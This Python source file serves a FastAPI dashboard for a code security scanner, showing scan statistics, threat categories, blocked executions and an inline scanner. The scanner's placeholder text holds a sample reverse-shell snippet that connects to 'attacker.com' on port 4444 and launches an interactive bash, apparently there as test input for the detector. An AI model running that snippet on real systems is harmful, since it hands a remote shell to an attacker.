"""
Nexus BNL — AST Security Dashboard
=====================================
Visual dashboard for the AST Security Engine.

Shows:
  - Live scan stats (total, blocked, blacklisted, critical)
  - Risk level distribution chart
  - Recent scans table with risk badges
  - Top detected threat categories
  - Taint flow count
  - Quarantine decisions (blocked-only filter)
  - Inline code scanner with live results

Run:
    uvicorn app.ast_dashboard:app --reload --port 8095
"""

import logging
from fastapi import FastAPI
from fastapi.responses import HTMLResponse, JSONResponse

from app.routes.ast_routes import router as ast_router

logger = logging.getLogger(__name__)

app = FastAPI(title="Nexus AST Security", docs_url="/api/docs", redoc_url=None)
app.include_router(ast_router)


@app.get("/health")
def health():
    return JSONResponse({"status": "ok", "service": "nexus-ast-security"})


_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Nexus — AST Security Engine</title>
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
  :root{
    --bg:#0b0b0f;--surface:#111118;--border:#1e1e2a;--muted:#3a3a50;
    --text:#c9d1d9;--dim:#666;
    --blue:#58a6ff;--green:#3fb950;--yellow:#e3b341;
    --red:#f85149;--purple:#bc8cff;--cyan:#39c5cf;--orange:#d4a72c;
    --mono:'Cascadia Code','Fira Code',Consolas,monospace;
  }
  body{font-family:var(--mono);background:var(--bg);color:var(--text);font-size:13px;min-height:100vh}

  #topbar{position:sticky;top:0;z-index:100;background:var(--surface);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:12px}
  .logo{color:var(--purple);font-size:15px;font-weight:700;letter-spacing:.04em}
  .logo-sub{color:var(--dim);font-size:11px}
  #sync-btn{margin-left:auto;padding:4px 14px;font-size:11px;font-family:var(--mono);border-radius:4px;border:1px solid var(--muted);background:var(--surface);color:#aaa;cursor:pointer}
  #sync-btn:hover{border-color:var(--purple);color:var(--purple)}
  #last-sync{color:var(--muted);font-size:10px;margin-left:8px}

  #content{padding:20px;max-width:1400px;margin:0 auto}

  /* Stats */
  #stats-row{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:10px;margin-bottom:22px}
  .stat-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:12px 14px}
  .stat-label{font-size:10px;color:var(--dim);text-transform:uppercase;letter-spacing:.06em}
  .stat-value{font-size:24px;font-weight:700;margin-top:4px}
  .c-blue{color:var(--blue)}.c-green{color:var(--green)}.c-yellow{color:var(--yellow)}
  .c-red{color:var(--red)}.c-purple{color:var(--purple)}.c-cyan{color:var(--cyan)}

  /* Layout */
  .two-col{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:18px}
  .three-col{display:grid;grid-template-columns:1fr 1fr 1fr;gap:18px;margin-bottom:18px}
  @media(max-width:1000px){.two-col,.three-col{grid-template-columns:1fr}}

  /* Sections */
  .section{background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:18px}
  .section-hdr{padding:10px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px;font-size:11px;text-transform:uppercase;letter-spacing:.07em;color:var(--dim)}
  .section-hdr .badge{margin-left:auto;background:#1a1a28;border-radius:10px;padding:1px 8px;font-size:11px;color:var(--muted)}

  /* Risk pills */
  .pill{display:inline-block;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700}
  .pill-SAFE       {background:#0d1a0a;color:var(--green)}
  .pill-LOW        {background:#0d1a28;color:var(--blue)}
  .pill-MEDIUM     {background:#2a2000;color:var(--yellow)}
  .pill-HIGH       {background:#2a1500;color:var(--orange)}
  .pill-CRITICAL   {background:#2a0d0d;color:var(--red)}
  .pill-BLACKLISTED{background:#1a0015;color:var(--purple);border:1px solid #5a0080;animation:pulse .8s infinite}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.6}}

  /* Tables */
  .data-table{width:100%;border-collapse:collapse}
  .data-table th{text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);padding:6px 10px;border-bottom:1px solid var(--border)}
  .data-table td{padding:7px 10px;border-bottom:1px solid #161620;font-size:11px;vertical-align:top;word-break:break-word}
  .data-table tr:last-child td{border-bottom:none}
  .data-table tr:hover td{background:#0e0e18}

  /* Category bar chart */
  .cat-bar-row{display:flex;align-items:center;gap:8px;padding:4px 14px;font-size:11px}
  .cat-label{width:120px;color:var(--dim);flex-shrink:0}
  .cat-bar{flex:1;height:6px;background:var(--border);border-radius:3px;position:relative}
  .cat-fill{position:absolute;left:0;top:0;bottom:0;border-radius:3px}
  .cat-count{width:30px;text-align:right;color:var(--text)}

  /* Scanner */
  #scanner-section{background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:18px}
  #code-input{
    width:100%;min-height:140px;background:#080810;
    color:#c9d1d9;font-family:var(--mono);font-size:12px;
    border:none;padding:12px;resize:vertical;
    border-bottom:1px solid var(--border);outline:none;
  }
  #scan-bar{display:flex;gap:8px;padding:10px 14px;align-items:center}
  #filename-input{
    flex:1;background:#0e0e16;border:1px solid var(--border);
    color:var(--text);font-family:var(--mono);font-size:11px;
    padding:4px 8px;border-radius:4px;
  }
  #scan-btn{
    padding:6px 18px;font-size:11px;font-family:var(--mono);
    border-radius:4px;border:1px solid var(--purple);
    background:#1a0a2a;color:var(--purple);cursor:pointer;
  }
  #scan-btn:hover{background:#220f38}
  #scan-btn:disabled{opacity:.4;cursor:not-allowed}
  #scan-result{padding:14px;display:none;border-top:1px solid var(--border)}
  .result-level{font-size:20px;font-weight:700;margin-bottom:8px}
  .result-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px}
  .result-item{background:#0e0e16;border-radius:4px;padding:8px}
  .result-item-label{font-size:10px;color:var(--dim)}
  .result-item-val{font-size:12px;color:var(--text);margin-top:2px}
  .finding-cat{margin-top:10px}
  .finding-cat-name{font-size:10px;text-transform:uppercase;color:var(--muted);margin-bottom:4px;letter-spacing:.05em}
  .finding-row{padding:3px 0;font-size:11px;display:flex;gap:6px;border-bottom:1px solid #181828}
  .finding-risk{color:var(--orange);width:30px;flex-shrink:0}
  .finding-name{color:var(--text)}
  .finding-desc{color:var(--dim);font-size:10px}

  .empty{padding:20px;text-align:center;color:var(--muted);font-size:11px}
  ::-webkit-scrollbar{width:5px}
  ::-webkit-scrollbar-track{background:var(--bg)}
  ::-webkit-scrollbar-thumb{background:var(--muted);border-radius:2px}
</style>
</head>
<body>

<div id="topbar">
  <span class="logo">⬡ Nexus</span>
  <span style="color:var(--muted)">|</span>
  <span class="logo-sub">AST Security Engine</span>
  <button id="sync-btn" onclick="loadAll()">↻ Refresh</button>
  <span id="last-sync"></span>
</div>

<div id="content">

  <!-- Stats -->
  <div id="stats-row">
    <div class="stat-card"><div class="stat-label">Total Scans</div><div class="stat-value c-blue"   id="s-total">—</div></div>
    <div class="stat-card"><div class="stat-label">Blocked</div><div class="stat-value c-red"    id="s-blocked">—</div></div>
    <div class="stat-card"><div class="stat-label">Blacklisted</div><div class="stat-value c-purple" id="s-black">—</div></div>
    <div class="stat-card"><div class="stat-label">Critical</div><div class="stat-value c-red"    id="s-crit">—</div></div>
    <div class="stat-card"><div class="stat-label">Findings</div><div class="stat-value c-orange" id="s-findings">—</div></div>
    <div class="stat-card"><div class="stat-label">Taint Flows</div><div class="stat-value c-cyan"   id="s-taint">—</div></div>
    <div class="stat-card"><div class="stat-label">Forensics</div><div class="stat-value c-yellow" id="s-forens">—</div></div>
  </div>

  <!-- Inline scanner -->
  <div id="scanner-section">
    <div class="section-hdr">▪ Live Code Scanner</div>
    <textarea id="code-input" placeholder="# Paste Python code here to scan for threats...
import socket, subprocess
s = socket.socket()
s.connect(('attacker.com', 4444))
subprocess.run(['/bin/bash', '-i'])"></textarea>
    <div id="scan-bar">
      <input id="filename-input" placeholder="filename.py" value="scan_test.py">
      <button id="scan-btn" onclick="doScan()">⚡ Scan Code</button>
    </div>
    <div id="scan-result"></div>
  </div>

  <div class="two-col">

    <!-- Recent scans -->
    <div class="section">
      <div class="section-hdr">▪ Recent Scans <span class="badge" id="scans-badge">0</span></div>
      <div style="padding:0">
        <table class="data-table">
          <thead><tr><th>Time</th><th>File</th><th>Score</th><th>Level</th><th>Action</th></tr></thead>
          <tbody id="scans-body"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
        </table>
      </div>
    </div>

    <!-- Top threats -->
    <div class="section">
      <div class="section-hdr">▪ Top Threats (by risk score) <span class="badge" id="threats-badge">0</span></div>
      <div style="padding:0">
        <table class="data-table">
          <thead><tr><th>ID</th><th>Category</th><th>Name</th><th>Risk</th></tr></thead>
          <tbody id="threats-body"><tr><td colspan="4" class="empty">Loading…</td></tr></tbody>
        </table>
      </div>
    </div>

  </div>

  <!-- Threat categories chart -->
  <div class="section">
    <div class="section-hdr">▪ Threat Category Distribution</div>
    <div id="cat-chart" style="padding:10px 0">
      <div class="empty">Loading…</div>
    </div>
  </div>

  <!-- Quarantine decisions -->
  <div class="section">
    <div class="section-hdr">▪ Blocked Executions <span class="badge" id="quar-badge">0</span></div>
    <div style="padding:0">
      <table class="data-table">
        <thead><tr><th>Time</th><th>Level</th><th>Action</th><th>Notify</th><th>Snap</th></tr></thead>
        <tbody id="quar-body"><tr><td colspan="5" class="empty">Loading…</td></tr></tbody>
      </table>
    </div>
  </div>

</div>

<script>
async function get(url){const r=await fetch(url);if(!r.ok)throw new Error('HTTP '+r.status);return r.json()}
async function post(url,body){const r=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});return r.json()}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
function ts(s){return s?s.replace('T',' ').replace('Z',''):'—'}
function levelPill(l){return `<span class="pill pill-${l||'SAFE'}">${esc(l||'SAFE')}</span>`}
function levelColor(l){
  return {SAFE:'var(--green)',LOW:'var(--blue)',MEDIUM:'var(--yellow)',HIGH:'var(--orange)',CRITICAL:'var(--red)',BLACKLISTED:'var(--purple)'}[l]||'var(--muted)'
}

function renderStats(s){
  document.getElementById('s-total').textContent    = s.total_scans      ??'—';
  document.getElementById('s-blocked').textContent  = s.blocked_scans    ??'—';
  document.getElementById('s-black').textContent    = s.blacklisted_scans??'—';
  document.getElementById('s-crit').textContent     = s.critical_scans   ??'—';
  document.getElementById('s-findings').textContent = s.total_findings   ??'—';
  document.getElementById('s-taint').textContent    = s.taint_flows      ??'—';
  document.getElementById('s-forens').textContent   = s.forensic_reports ??'—';
}

function renderScans(scans){
  const tbody = document.getElementById('scans-body');
  document.getElementById('scans-badge').textContent = scans.length;
  if(!scans.length){tbody.innerHTML='<tr><td colspan="5" class="empty">No scans yet</td></tr>';return}
  tbody.innerHTML = scans.slice(0,30).map(s=>`<tr>
    <td style="color:var(--dim);white-space:nowrap;font-size:10px">${ts(s.scanned_at)}</td>
    <td style="color:var(--blue);font-size:10px">${esc(s.filename.slice(-30))}</td>
    <td style="color:${levelColor(s.risk_level)};font-weight:700">${s.final_score}</td>
    <td>${levelPill(s.risk_level)}</td>
    <td style="color:${s.action==='ALLOW'?'var(--green)':'var(--red)'}">${esc(s.action)}</td>
  </tr>`).join('');
}

function renderThreats(threats){
  const tbody = document.getElementById('threats-body');
  document.getElementById('threats-badge').textContent = threats.length;
  if(!threats.length){tbody.innerHTML='<tr><td colspan="4" class="empty">No threats</td></tr>';return}
  tbody.innerHTML = threats.slice(0,20).map(t=>`<tr>
    <td style="color:var(--dim);font-size:10px">${esc(t.pattern_id||t.id||'')}</td>
    <td style="color:var(--cyan)">${esc(t.category)}</td>
    <td style="color:var(--text)">${esc(t.name)}</td>
    <td style="color:${t.risk_score>=60?'var(--red)':t.risk_score>=30?'var(--orange)':'var(--yellow)'};font-weight:700">${t.risk_score}</td>
  </tr>`).join('');
}

function renderCategoryChart(threats){
  const chart = document.getElementById('cat-chart');
  const counts = {};
  threats.forEach(t=>{counts[t.category]=(counts[t.category]||0)+1});
  const max = Math.max(1,...Object.values(counts));
  const colors = {
    import:'var(--blue)',obfuscation:'var(--purple)',subprocess:'var(--orange)',
    persistence:'var(--yellow)',exfiltration:'var(--red)',privilege:'var(--cyan)',
    filesystem:'var(--green)',runtime_payload:'var(--orange)',taint_flow:'var(--purple)',
  };
  chart.innerHTML = Object.entries(counts)
    .sort(([,a],[,b])=>b-a)
    .map(([cat,cnt])=>`
      <div class="cat-bar-row">
        <span class="cat-label">${esc(cat)}</span>
        <div class="cat-bar">
          <div class="cat-fill" style="width:${(cnt/max)*100}%;background:${colors[cat]||'var(--blue)'}"></div>
        </div>
        <span class="cat-count">${cnt}</span>
      </div>
    `).join('');
  if(!Object.keys(counts).length) chart.innerHTML = '<div class="empty">No threat data</div>';
}

function renderQuarantine(decisions){
  const tbody = document.getElementById('quar-body');
  document.getElementById('quar-badge').textContent = decisions.length;
  if(!decisions.length){tbody.innerHTML='<tr><td colspan="5" class="empty">No blocked executions</td></tr>';return}
  tbody.innerHTML = decisions.slice(0,30).map(d=>`<tr>
    <td style="color:var(--dim);white-space:nowrap;font-size:10px">${ts(d.decided_at)}</td>
    <td>${levelPill(d.risk_level)}</td>
    <td style="color:var(--red);font-weight:700">${esc(d.action)}</td>
    <td style="color:${d.notify_security?'var(--yellow)':'var(--dim)'}">${d.notify_security?'YES':'no'}</td>
    <td style="color:${d.create_snapshot?'var(--green)':'var(--dim)'}">${d.create_snapshot?'YES':'no'}</td>
  </tr>`).join('');
}

// ── Inline scanner ─────────────────────────────────────────────────────────────

async function doScan(){
  const btn = document.getElementById('scan-btn');
  const src  = document.getElementById('code-input').value.trim();
  const fname = document.getElementById('filename-input').value || 'code.py';
  const res  = document.getElementById('scan-result');

  if(!src){alert('Paste some code first');return}
  btn.disabled=true; btn.textContent='Scanning…';
  res.style.display='none';

  try {
    const data = await post('/ast/analyze',{source:src,filename:fname});
    const r = data;
    const levelC = levelColor(r.risk_level);

    let findingsHtml = '';
    const fc = r.summary?.finding_counts||{};
    const fdata = r.full_report?.findings||{};
    for(const [cat,items] of Object.entries(fdata)){
      if(!items||!items.length) continue;
      findingsHtml += `<div class="finding-cat">
        <div class="finding-cat-name">${esc(cat)} (${items.length})</div>
        ${items.slice(0,5).map(f=>`
          <div class="finding-row">
            <span class="finding-risk">+${f.risk_score||0}</span>
            <div>
              <div class="finding-name">${esc(f.name||f.pattern_id||'')}</div>
              <div class="finding-desc">${esc((f.description||'').slice(0,80))}</div>
            </div>
          </div>
        `).join('')}
      </div>`;
    }

    res.innerHTML = `
      <div class="result-level" style="color:${levelC}">${esc(r.risk_level)} — Score: ${r.final_score}/100</div>
      <div style="margin-bottom:10px">
        ${levelPill(r.risk_level)}
        <span style="margin-left:8px;color:${r.blocked?'var(--red)':'var(--green)'}">
          ${r.blocked?'⛔ BLOCKED':'✓ ALLOWED'}
        </span>
        <span style="margin-left:8px;color:var(--dim);font-size:11px">action: ${esc(r.action)}</span>
      </div>
      <div class="result-grid">
        <div class="result-item"><div class="result-item-label">Findings</div><div class="result-item-val">${r.summary?.total_findings||0}</div></div>
        <div class="result-item"><div class="result-item-label">Lines</div><div class="result-item-val">${r.summary?.line_count||0}</div></div>
        <div class="result-item"><div class="result-item-label">Taint flows</div><div class="result-item-val">${fc.taint_flows||0}</div></div>
        <div class="result-item"><div class="result-item-label">Imports</div><div class="result-item-val">${fc.imports||0}</div></div>
        <div class="result-item"><div class="result-item-label">Subprocess</div><div class="result-item-val">${fc.subprocess||0}</div></div>
        <div class="result-item"><div class="result-item-label">Obfuscation</div><div class="result-item-val">${fc.obfuscation||0}</div></div>
      </div>
      ${findingsHtml}
      <div style="margin-top:10px;color:var(--dim);font-size:10px">Scan ID: ${esc(r.scan_id)}</div>
    `;
    res.style.display='block';
  } catch(e){
    res.innerHTML=`<div style="color:var(--red)">Error: ${esc(e.message)}</div>`;
    res.style.display='block';
  } finally {
    btn.disabled=false; btn.textContent='⚡ Scan Code';
  }
}

// ── Load all ───────────────────────────────────────────────────────────────────
async function loadAll(){
  document.getElementById('last-sync').textContent='syncing…';
  try{
    const [statsR,scansR,threatsR,quarR] = await Promise.all([
      get('/ast/status'),
      get('/ast/reports?limit=50'),
      get('/ast/threats?limit=100'),
      get('/ast/quarantine?blocked_only=true'),
    ]);
    renderStats(statsR.stats||{});
    renderScans(scansR.scans||[]);
    renderThreats(threatsR.threats||[]);
    renderCategoryChart(threatsR.threats||[]);
    renderQuarantine(quarR.decisions||[]);
    document.getElementById('last-sync').textContent='synced '+new Date().toLocaleTimeString();
  }catch(e){
    console.error('loadAll',e);
    document.getElementById('last-sync').textContent='error: '+e.message;
  }
}
loadAll();
setInterval(loadAll,10000);
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
def dashboard():
    return HTMLResponse(_HTML)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app.ast_dashboard:app", host="0.0.0.0", port=8095, reload=True)
